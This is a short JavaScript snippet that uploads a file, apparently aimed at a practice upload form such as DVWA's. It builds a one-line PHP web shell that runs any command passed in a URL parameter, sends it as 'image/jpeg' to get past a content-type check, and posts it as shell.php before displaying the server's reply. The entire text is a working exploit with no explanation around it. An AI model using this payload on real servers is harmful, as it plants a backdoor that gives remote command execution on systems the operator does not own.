const payload = `<?php system($_GET['cmd']); ?>`;
const file = new Blob([payload], { type: "image/jpeg" });
const form = new FormData();
form.append("uploaded", file, "shell.php");
form.append("Upload", "Upload");
fetch(window.location.href, {
    method: "POST",
    body: form
}).then(response => {
    return response.text();
}).then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");
    document.replaceChild(
        document.adoptNode(doc.documentElement),
        document.documentElement
    );
});
